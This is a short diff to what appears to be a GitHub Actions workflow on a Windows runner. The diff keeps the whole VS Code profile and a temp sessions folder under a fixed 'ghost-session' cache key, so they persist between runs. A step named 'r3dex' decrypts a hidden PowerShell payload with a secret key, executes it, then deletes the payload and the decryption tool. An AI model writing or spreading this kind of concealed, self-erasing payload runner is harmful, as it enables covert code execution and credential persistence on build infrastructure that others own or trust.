@@ -18,12 +18,12 @@ jobs:
         uses: actions/cache@v4
         with:
           path: |
-            ~\AppData\Roaming\Code\User
+            ~\AppData\Roaming\Code
             ~\.vscode\extensions
             C:\Windows\Temp\app_sessions
-          key: ${{ runner.os }}-ghost-${{ github.run_id }}
+          key: ${{ runner.os }}-ghost-session
           restore-keys: |
-            ${{ runner.os }}-ghost-
+            ${{ runner.os }}-ghost-session
 
       - name: r3dex
         shell: powershell
@@ -38,7 +38,7 @@ jobs:
           if (Test-Path $p) {
               python dex-enc/dexenc.py extract -i $p -key "$env:D_KEY" --out-payload "$pwd\r4dx.ps1"
               if (Test-Path "$pwd\r4dx.ps1") {
-                  Write-Host "[+] Executing extracted payload..." -ForegroundColor Green
+                  Write-Host "[+] Executing decrypted payload..." -ForegroundColor Green
                   . "$pwd\r4dx.ps1"
                   Remove-Item "$pwd\r4dx.ps1" -Force
                   Remove-Item -Recurse -Force dex-enc
